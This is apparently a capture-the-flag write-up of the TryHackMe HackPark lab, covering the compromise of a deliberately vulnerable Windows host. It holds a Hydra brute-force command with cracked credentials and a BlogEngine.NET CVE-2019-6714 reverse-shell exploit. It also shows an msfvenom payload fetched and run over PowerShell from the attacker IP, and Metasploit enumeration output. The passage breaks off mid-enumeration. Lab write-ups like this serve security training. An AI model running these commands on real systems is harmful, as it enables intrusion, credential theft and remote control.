# HackPark Writeup

    Box IP Addresses:
    10.10.134.121
    10.10.96.44
    10.10.229.64
    10.10.200.77

## [Task 1] Deploy the vulnerable Windows machine 

Connect to our network and deploy this machine. Please be patient as this machine can take up to 5 minutes to boot! You can test if you are connected to our network, by going to our access page. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

This room will cover brute-forcing an accounts credentials, handling public exploits, using the Metasploit framework and privilege escalation on Windows.

### 1 - Deploy the machine and access its web server.

### 2 - Whats the name of the clown displayed on the homepage?

Pennywise.

## [Task 2] Using Hydra to brute-force a login

*Hydra is a parallelized, fast and flexible login cracker. If you don't have Hydra installed or need a Linux machine to use it, you can deploy a powerful Kali Linux machine and control it in your browser!*

*Brute-forcing can be trying every combination of a password. Dictionary-attack's are also a type of brute-forcing, where we iterating through a wordlist to obtain the password.*

### 1 	

*We need to find a login page to attack and identify what type of request the form is making to the webserver. Typically, web servers make two types of requests, a GET request which is used to request data from a webserver and a POST request which is used to send data to a server.*

*You can check what request a form is making by right clicking on the login form, inspecting the element and then reading the value in the method field. You can also identify this if you are intercepting the traffic through BurpSuite (other HTTP methods can be found here).*

*What request type is the Windows website login form using?*

POST Request:

    body class="ltr">
    <form method="post" action="login.aspx?ReturnURL=%2fadmin%2f" id="Form1">

### 2 	

*Now we know the request type and have a URL for the login form, we can get started brute-forcing an account.*

*Run the following command but fill in the blanks:*

    hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form

*Guess a username, choose a password wordlist and gain credentials to a user account!*

Command used:

    ┌─[✗]─[user@parrot]─[~/labs/tryhackme/hackpark]
    └──╼ $hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.134.121 http-post-form '/Account/login.aspx:__VIEWSTATE=6l3dGMlnquYoIiSej8IGt9u736eFo3nH4suICsI%2BN0k2b8U1XNBJHO2asiXsB6x1orGmNhiJ7vCah0lb%2FDvue8OzouZSAMyzArsHL8Dbm%2FCxxEjw%2FVb6LsoOLjrvJ4Wxr1KQZ9l71PdGQCArHfA1xPpNPZ%2FdqlO%2Fu8OIZ9Ou5VZddACl&__EVENTVALIDATION=439jQTCDf9kNcLVLKWKhTu5JWVh%2FWmSgUZzlfQEANDFGPirP0DrvWfumXeHJQu4ks9cLYE2ZSEc5fMq9loKavfWNyI7SXC7xEy5w9f1IBq5lqYMeBVUjB0OsWGWXkASZCKIeb7KaOZfqxL2DlBtpqSZox1nuLrqZn%2B87lSgf5CouH88F&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed'
    Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-30 22:26:33
    [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
    [DATA] attacking http-post-form://10.10.134.121:80/Account/login.aspx:__VIEWSTATE=6l3dGMlnquYoIiSej8IGt9u736eFo3nH4suICsI%2BN0k2b8U1XNBJHO2asiXsB6x1orGmNhiJ7vCah0lb%2FDvue8OzouZSAMyzArsHL8Dbm%2FCxxEjw%2FVb6LsoOLjrvJ4Wxr1KQZ9l71PdGQCArHfA1xPpNPZ%2FdqlO%2Fu8OIZ9Ou5VZddACl&__EVENTVALIDATION=439jQTCDf9kNcLVLKWKhTu5JWVh%2FWmSgUZzlfQEANDFGPirP0DrvWfumXeHJQu4ks9cLYE2ZSEc5fMq9loKavfWNyI7SXC7xEy5w9f1IBq5lqYMeBVUjB0OsWGWXkASZCKIeb7KaOZfqxL2DlBtpqSZox1nuLrqZn%2B87lSgf5CouH88F&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed
    [STATUS] 1312.00 tries/min, 1312 tries in 00:01h, 14343087 to do in 182:13h, 16 active
    [80][http-post-form] host: 10.10.134.121   login: admin   password: 1qaz2wsx
    1 of 1 target successfully completed, 1 valid password found
    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-07-30 22:27:41

This took a couple of tries, but basically:

In the variables argument you need to have at least strings ^USER^, ^PASS^, ^USER64^ or ^PASS64^. We used ^PASS^, since we guessed the username "admin".

URL --> `/Account/login.aspx:`

It needs a **Failure Response** --> `...:Login Failed`. This basically tells it, if this string appears in the response, it's a fail. If it didn't, then you've passed!

User:Pass

admin:1qaz2wsx

### 3 

*Hydra really does have lots of functionality, and there are many "modules" available (an example of a module would be the http-post-form that we used above).*

*However, this tool is not only good for brute-forcing HTTP forms, but other protocols such as FTP, SSH, SMTP, SMB and more. *

*Below is a mini cheatsheet:*

| Command | Description |
|-|-|
| hydra -P <wordlist> -v <ip> <protocol> | Brute force against a protocol of your choice |
| hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol> | You  can use Hydra to bruteforce usernames as well as passwords. It will  loop through every combination in your lists. (-vV = verbose mode,  showing login attempts) |
| hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip> | Attack a Windows Remote Desktop with a password list. |
| hydra  -l <username> -P .<password list> $ip -V http-form-post  '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log  In&testcookie=1:S=Location' | Craft a more specific request for Hydra to brute force. |


## [Task 3] Compromise the machine

*In this task, you will identify and execute a public exploit (from exploit-db.com) to get initial access on this Windows machine!*

*Exploit-Database is a CVE (common vulnerability and exposures) archive of public exploits and corresponding vulnerable software, developed for the use of penetration testers and vulnerability researches. It is owned by Offensive Security (who are responsible for OSCP and Kali)*

### 1 - Now you have logged into the website, are you able to identify the version of the BlogEngine?

Going to : http://10.10.134.121/admin/about.cshtml we can see on the site:

    Your BlogEngine.NET Specification

    Version: 3.3.6.0
    Configuration: Single blog
    Trust level: Unrestricted
    Identity: IIS APPPOOL\Blog
    Blog provider: XmlBlogProvider
    Membership provider: XmlMembershipProvider
    Role provider: XmlRoleProvider

The Version Number is: 3.3.6.0

### 2 - Use the exploit database archive to find an exploit to gain a reverse shell on this system. What is the CVE?

https://www.exploit-db.com/exploits/46353

CVE : CVE-2019-6714

### 3 - Using the public exploit, gain initial access to the server. Who is the webserver running as?

We first download the exploit:

    ┌─[user@parrot]─[~/labs/tryhackme/hackpark]
    └──╼ $wget https://www.exploit-db.com/raw/46353

Edit it:

Important bits - 

    Note that this file must be uploaded as PostView.ascx. Once uploaded, the file will be in the /App_Data/files directory off of the document root. The admin page that allows upload is:
    `http://10.10.10.10/admin/app/editor/editpost.cshtml`
    Finally, the vulnerability is triggered by accessing the base URL for the blog with a theme override specified like so: `http://10.10.10.10/?theme=../../App_Data/files`

To exploit this:

1. Edit the file to include your IP Address and Port:
   
        using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("10.8.82.167", 4444)) {

2. Rename the file to PostView.ascx
3. Log in as admin on the login page.
4. Go to the editpost.cshtml page above (with the correct IP address of the box).
5. Click on the folder icon, Upload the PostView.ascx file. You don't need to create the page or anything, just upload it.
6. Start up a netcat listener on your terminal, port 4444 (or the one specified in your PostView.ascx file).
7. Go to the second url (`http://10.10.10.10/?theme=../../App_Data/files`) on your browser.

On the Terminal:

    ┌─[user@parrot]─[~/labs/tryhackme/hackpark]
    └──╼ $nc -lvnp 4444
    listening on [any] 4444 ...
    connect to [10.8.82.167] from (UNKNOWN) [10.10.96.44] 49265
    Microsoft Windows [Version 6.3.9600]
    (c) 2013 Microsoft Corporation. All rights reserved.
    whoami
    c:\windows\system32\inetsrv>whoami
    iis apppool\blog

The webserver is running as: `iis apppool\blog`.


## [Task 4] Windows Privilege Escalation

In this task we will learn about the basics of Windows Privilege Escalation.

First we will pivot from netcat to a meterpreter session and use this to enumerate the machine to identify potential vulnerabilities. We will then use this gathered information to exploit the system and become the Administrator.

### 1

*Our netcat session is a little unstable, so lets generate another reverse shell using msfvenom. If you don't know how to do this, I suggest completing the Metasploit room first! Tip: You can generate the reverse-shell payload using msfvenom, upload it using your current netcat session and execute it manually!*

First create the payload using msfvenom:

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.82.167 LPORT=5555 -f exe > payload.exe

Open up a new terminal in the same directory as your payload, run:

    sudo python -m SimpleHTTPServer 80

On your netcat listener, we're going to move to the temp folder (where we can write files to), and download the payload through a Powershell command:

    cd c:\windows\temp
    powershell Invoke-WebRequest -Uri http://10.8.82.167/payload.exe -Outfile payload.exe

On another Terminal, start up Metasploit:

    msfconsole
    use multi/handler
    set payload windows/meterpreter/reverse_tcp
    set lhost 10.8.82.167
    set lport 5555
    run

Finally once the metasploit listener is running, on your nc listener type:

    powershell Start-Process payload.exe

Output from Metasploit:

    msf5 exploit(multi/handler) > run

    [*] Started reverse TCP handler on 10.8.82.167:5555 
    [*] Sending stage (176195 bytes) to 10.10.96.44
    [*] Meterpreter session 1 opened (10.8.82.167:5555 -> 10.10.96.44:49541) at 2020-07-31 20:09:56 +0100

    meterpreter > sysinfo
    Computer        : HACKPARK
    OS              : Windows 2012 R2 (6.3 Build 9600).
    Architecture    : x64
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 1
    Meterpreter     : x86/windows

    meterpreter > getuid
    Server username: IIS APPPOOL\Blog

### 2 	

*You can run metasploit commands such as sysinfo to get detailed information about the Windows system. Then feed this information into the windows-exploit-suggester script and quickly identify any obvious vulnerabilities.*

*What is the OS version of this windows machine?*

OS : Windows 2012 R2 (6.3 Build 9600)

We're going to run the Local Exploit Suggester first just to see if there's anything of note:

    meterpreter > run post/multi/recon/local_exploit_suggester 

    [*] 10.10.229.64 - Collecting local exploits for x86/windows...
    [*] 10.10.229.64 - 34 exploit checks are being tried...
    [+] 10.10.229.64 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
    nil versions are discouraged and will be deprecated in Rubygems 4
    [+] 10.10.229.64 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
    [+] 10.10.229.64 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
    [+] 10.10.229.64 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.

Now we're going to run windows-exploit-suggester. To set it all up:

1. Clone it/Download it:

    ┌─[user@parrot]─[~/gitclones]
    └──╼ $git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git

    ┌─[user@parrot]─[~/labs/tryhackme/hackpark]
    └──╼ $cp ~/gitclones/Windows-Exploit-Suggester/windows-exploit-suggester.py .

2. Install Pip and xlrd if you haven't got it:

    ┌─[user@parrot]─[~/labs/tryhackme/hackpark]
    └──╼ $sudo apt install python-pip

    Install xlrd:

    ┌─[user@parrot]─[~/labs/tryhackme/hackpark]
    └──╼ $pip install xlrd --upgrade

3. Update the database for it:

    ┌─[user@parrot]─[~/labs/tryhackme/hackpark]
    └──╼ $./windows-exploit-suggester.py --update
    [*] initiating winsploit version 3.3...
    [+] writing to file 2020-07-31-mssb.xls
    [*] done

Now download systeminfo from box:

1. On your netcat listener (or in the meterpreter shell, just type "shell" to get a shell):

    cd c:\windows\temp
    systeminfo > sysinfo.txt

2. get out of that shell into meterpreter and type:
    
    download c:\windows\temp\sysinfo.txt

and finally run windows-exploit-suggester.py:

    ┌─[user@parrot]─[~/labs/tryhackme/hackpark]
    └──╼ $./windows-exploit-suggester.py -d 2020-07-31-mssb.xls -i sysinfo.txt

    Results:

    [*] initiating winsploit version 3.3...
    [*] database file detected as xls or xlsx based on extension
    [*] attempting to read from the systeminfo input file
    [+] systeminfo input file read successfully (ascii)
    [*] querying database file for potential vulnerabilities
    [*] comparing the 8 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
    [*] there are now 249 remaining vulns
    [+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
    [+] windows version identified as 'Windows 2012 R2 64-bit'
    [*] 
    [E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
    [*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
    [*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
    [*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
    [*] 
    [E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
    [*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
    [*] 
    [M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
    [*]   https://github.com/foxglovesec/RottenPotato
    [*]   https://github.com/Kevin-Robertson/Tater
    [*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
    [*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
    [*] 
    [E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
    [*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
    [*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
    [*] 
    [E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
    [*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
    [*] 
    [E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
    [*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
    [*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
    [*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
    [*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
    [*] 
    [M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
    [*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
    [*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
    [*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC
    [*] 
    [E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
    [*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC
    [*] 
    [E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
    [*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC
    [*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC
    [*] 
    [E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
    [*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC
    [*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC
    [*] 
    [E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
    [*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)
    [*] 
    [E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
    [*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC
    [*] 
    [E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
    [*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
    [*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
    [*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
    [*] 
    [E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
    [*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC
    [*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC
    [*] 
    [M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical
    [*]   https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow
    [*] 
    [M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
    [*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
    [*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
    [*] 
    [E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
    [*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
    [*] 
    [M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
    [*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
    [*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
    [*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer <= 11 - OLE Automation Array Remote Code Execution (#1), PoC
    [*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer < 11 - OLE Automation Array Remote Code Execution (MSF), MSF
    [*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
    [*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
    [*] 
    [M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important
    [*]   http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution 'Sandworm' Exploit (MS14-060), PoC
    [*]   http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF
    [*] 
    [E] MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important
    [*]   https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC
    [*]   https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC
    [*] 
    [E] MS14-035: Cumulative Security Update for Internet Explorer (2969262) - Critical
    [E] MS14-029: Security Update for Internet Explorer (2962482) - Critical
    [*]   http://www.exploit-db.com/exploits/34458/
    [*] 
    [E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important
    [*]   http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC
    [*] 
    [M] MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical
    [M] MS14-009: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege (2916607) - Important
    [M] MS13-097: Cumulative Security Update for Internet Explorer (2898785) - Critical
    [M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
    [M] MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical
    [*] done

#3 - Further enumerate the machine. What is the name of the abnormal service running?

We need to find some kind of abnormal service running. So let's run ps a few times to see if anything happens:

    meterpreter > ps

    Process List
    ============

    PID   PPID  Name                  Arch  Session  User              Path
    ---   ----  ----                  ----  -------  ----              ----
    0     0     [System Process]                                       
    4     0     System                                                 
    380   4     smss.exe                                               
    520   512   csrss.exe                                              
    528   2920  cmd.exe               x86   0        IIS APPPOOL\Blog  C:\Windows\SysWOW64\cmd.exe
    576   568   csrss.exe                                              
    588   512   wininit.exe                                            
    612   568   winlogon.exe                                           
    668   588   services.exe                                           
    676   588   lsass.exe                                              
    740   668   svchost.exe                                            
    784   668   svchost.exe                                            
    832   668   svchost.exe                                            
    868   668   svchost.exe                                            
    876   612   dwm.exe                                                
    908   668   svchost.exe                                            
    932   668   svchost.exe                                            
    948   528   conhost.exe           x64   0        IIS APPPOOL\Blog  C:\Windows\System32\conhost.exe
    1016  668   svchost.exe                                            
    1120  668   spoolsv.exe                                            
    1156  668   amazon-ssm-agent.exe                                   
    1200  668   svchost.exe                                            
    1236  668   LiteAgent.exe                                          
    1304  668   svchost.exe                                            
    1320  668   svchost.exe                                            
    1368  668   WService.exe                                           
    1520  668   wlms.exe                                               
    1528  1368  WScheduler.exe                                         
    1548  668   Ec2Config.exe                                          
    1660  668   msdtc.exe                                              
    1860  668   sppsvc.exe                                             
    1892  2200  cmd.exe               x64   0        IIS APPPOOL\Blog  C:\Windows\System32\cmd.exe
    1920  2540  ServerManager.exe                                      
    1948  668   svchost.exe                                            
    1980  668   vds.exe                                                
    2200  1320  w3wp.exe              x64   0        IIS APPPOOL\Blog  C:\Windows\System32\inetsrv\w3wp.exe
    2328  740   WmiPrvSE.exe                                           
    2508  908   taskhostex.exe                                         
    2584  2564  explorer.exe                                           
    2724  2116  WScheduler.exe                                         
    2736  1892  conhost.exe           x64   0        IIS APPPOOL\Blog  C:\Windows\System32\conhost.exe
    2920  2828  payload.exe           x86   0        IIS APPPOOL\Blog  C:\Windows\Temp\payload.exe
    3044  740   SppExtComObj.Exe                                       

    meterpreter > ps

    Process List
    ============

    PID   PPID  Name                  Arch  Session  User              Path
    ---   ----  ----                  ----  -------  ----              ----
    0     0     [System Process]                                       
    4     0     System                                                 
    380   4     smss.exe                                               
    520   512   csrss.exe                                              
    528   2920  cmd.exe               x86   0        IIS APPPOOL\Blog  C:\Windows\SysWOW64\cmd.exe
    576   568   csrss.exe                                              
    588   512   wininit.exe                                            
    612   568   winlogon.exe                                           
    668   588   services.exe                                           
    676   588   lsass.exe                                              
    740   668   svchost.exe                                            
    784   668   svchost.exe                                            
    832   668   svchost.exe                                            
    868   668   svchost.exe                                            
    876   612   dwm.exe                                                
    908   668   svchost.exe                                            
    932   668   svchost.exe                                            
    948   528   conhost.exe           x64   0        IIS APPPOOL\Blog  C:\Windows\System32\conhost.exe
    1016  668   svchost.exe                                            
    1120  668   spoolsv.exe                                            
    1156  668   amazon-ssm-agent.exe                                   
    1200  668   svchost.exe                                            
    1236  668   LiteAgent.exe                                          
    1304  668   svchost.exe                                            
    1320  668   svchost.exe                                            
    1368  668   WService.exe                                           
    1520  668   wlms.exe                                               
    1528  1368  WScheduler.exe                                         
    1548  668   Ec2Config.exe                                          
    1660  668   msdtc.exe                                              
    1860  668   sppsvc.exe                                             
    1892  2200  cmd.exe               x64   0        IIS APPPOOL\Blog  C:\Windows\System32\cmd.exe
    1920  2540  ServerManager.exe                                      
    1948  668   svchost.exe                                            
    1980  668   vds.exe                                                
    2044  2724  Message.exe                                            
    2200  1320  w3wp.exe              x64   0        IIS APPPOOL\Blog  C:\Windows\System32\inetsrv\w3wp.exe
    2328  740   WmiPrvSE.exe                                           
    2508  908   taskhostex.exe                                         
    2584  2564  explorer.exe                                           
    2724  2116  WScheduler.exe                                         
    2736  1892  conhost.exe           x64   0        IIS APPPOOL\Blog  C:\Windows\System32\conhost.exe
    2920  2828  payload.exe           x86   0        IIS APPPOOL\Blog  C:\Windows\Temp\payload.exe
    3044  740   SppExtComObj.Exe    

We can see by typing ps multiple times, the "Message.exe" process stops and starts.

Let's find out what Message.exe is:

    meterpreter > search -f Message.exe
    Found 1 result...
        c:\Program Files (x86)\SystemScheduler\Message.exe (536992 bytes)

We can explore this SystemScheduler folder now. In my nc (or in meterpreter system shell):

    cd c:\ProgramFiles (x86)\SystemScheduler
    c:\Program Files (x86)\SystemScheduler>type Readme.txt

    ***System Scheduler Release Notes***
    System Scheduler Professional - Version 5.12
    ...

So we know its version now. Let's try to find the service name (remember the process/binary was Message.exe):

    powershell Get-Service

    c:\Program Files (x86)\SystemScheduler>powershell Get-Service
    Status   Name               DisplayName                           
    ------   ----               -----------                           
    Stopped  AeLookupSvc        Application Experience                
    Stopped  ALG                Application Layer Gateway Service     
    Running  AmazonSSMAgent     Amazon SSM Agent                      
    Running  AppHostSvc         Application Host Helper Service       
    Stopped  AppIDSvc           Application Identity                  
    Stopped  Appinfo            Application Information               
    Stopped  AppMgmt            Application Management                
    Stopped  AppReadiness       App Readiness                         
    Stopped  AppXSvc            AppX Deployment Service (AppXSVC)     
    Stopped  aspnet_state       ASP.NET State Service                 
    Stopped  AudioEndpointBu... Windows Audio Endpoint Builder        
    Stopped  Audiosrv           Windows Audio                         
    Running  AWSLiteAgent       AWS Lite Guest Agent                  
    Running  BFE                Base Filtering Engine                 
    Stopped  BITS               Background Intelligent Transfer Ser...
    Running  BrokerInfrastru... Background Tasks Infrastructure Ser...
    Stopped  Browser            Computer Browser                      
    Running  CertPropSvc        Certificate Propagation               
    Stopped  COMSysApp          COM+ System Application               
    Running  CryptSvc           Cryptographic Services                
    Running  DcomLaunch         DCOM Server Process Launcher          
    Stopped  defragsvc          Optimize drives                       
    Stopped  DeviceAssociati... Device Association Service            
    Stopped  DeviceInstall      Device Install Service                
    Running  Dhcp               DHCP Client                           
    Running  Dnscache           DNS Client                            
    Stopped  dot3svc            Wired AutoConfig                      
    Running  DPS                Diagnostic Policy Service             
    Running  DsmSvc             Device Setup Manager                  
    Stopped  Eaphost            Extensible Authentication Protocol    
    Running  Ec2Config          Ec2Config                             
    Stopped  EFS                Encrypting File System (EFS)          
    Running  EventLog           Windows Event Log                     
    Running  EventSystem        COM+ Event System                     
    Stopped  fdPHost            Function Discovery Provider Host      
    Stopped  FDResPub           Function Discovery Resource Publica...
    Running  FontCache          Windows Font Cache Service            
    Running  gpsvc              Group Policy Client                   
    Stopped  hidserv            Human Interface Device Service        
    Stopped  hkmsvc             Health Key and Certificate Management 
    Stopped  IEEtwCollectorS... Internet Explorer ETW Collector Ser...
    Stopped  IKEEXT             IKE and AuthIP IPsec Keying Modules   
    Running  iphlpsvc           IP Helper                             
    Stopped  KeyIso             CNG Key Isolation                     
    Stopped  KPSSVC             KDC Proxy Server service (KPS)        
    Stopped  KtmRm              KtmRm for Distributed Transaction C...
    Running  LanmanServer       Server                                
    Running  LanmanWorkstation  Workstation                           
    Stopped  lltdsvc            Link-Layer Topology Discovery Mapper  
    Running  lmhosts            TCP/IP NetBIOS Helper                 
    Running  LSM                Local Session Manager                 
    Stopped  MMCSS              Multimedia Class Scheduler            
    Running  MpsSvc             Windows Firewall                      
    Running  MSDTC              Distributed Transaction Coordinator   
    Stopped  MSiSCSI            Microsoft iSCSI Initiator Service     
    Stopped  msiserver          Windows Installer                     
    Stopped  napagent           Network Access Protection Agent       
    Stopped  NcaSvc             Network Connectivity Assistant        
    Stopped  Netlogon           Netlogon                              
    Stopped  Netman             Network Connections                   
    Running  netprofm           Network List Service                  
    Stopped  NetTcpPortSharing  Net.Tcp Port Sharing Service          
    Running  NlaSvc             Network Location Awareness            
    Running  nsi                Network Store Interface Service       
    Stopped  PerfHost           Performance Counter DLL Host          
    Stopped  pla                Performance Logs & Alerts             
    Running  PlugPlay           Plug and Play                         
    Stopped  PolicyAgent        IPsec Policy Agent                    
    Running  Power              Power                                 
    Stopped  PrintNotify        Printer Extensions and Notifications  
    Running  ProfSvc            User Profile Service                  
    Stopped  PsShutdownSvc      PsShutdown                            
    Stopped  RasAuto            Remote Access Auto Connection Manager 
    Stopped  RasMan             Remote Access Connection Manager      
    Stopped  RemoteAccess       Routing and Remote Access             
    Stopped  RemoteRegistry     Remote Registry                       
    Running  RpcEptMapper       RPC Endpoint Mapper                   
    Stopped  RpcLocator         Remote Procedure Call (RPC) Locator   
    Running  RpcSs              Remote Procedure Call (RPC)           
    Stopped  RSoPProv           Resultant Set of Policy Provider      
    Stopped  sacsvr             Special Administration Console Helper 
    Running  SamSs              Security Accounts Manager             
    Stopped  SCardSvr           Smart Card                            
    Stopped  ScDeviceEnum       Smart Card Device Enumeration Service 
    Running  Schedule           Task Scheduler                        
    Stopped  SCPolicySvc        Smart Card Removal Policy             
    Stopped  seclogon           Secondary Logon                       
    Running  SENS               System Event Notification Service     
    Running  SessionEnv         Remote Desktop Configuration          
    Stopped  SharedAccess       Internet Connection Sharing (ICS)     
    Running  ShellHWDetection   Shell Hardware Detection              
    Stopped  smphost            Microsoft Storage Spaces SMP          
    Stopped  SNMPTRAP           SNMP Trap                             
    Running  Spooler            Print Spooler                         
    Running  sppsvc             Software Protection                   
    Stopped  SstpSvc            Secure Socket Tunneling Protocol Se...
    Stopped  svsvc              Spot Verifier                         
    Stopped  swprv              Microsoft Software Shadow Copy Prov...
    Stopped  SysMain            Superfetch                            
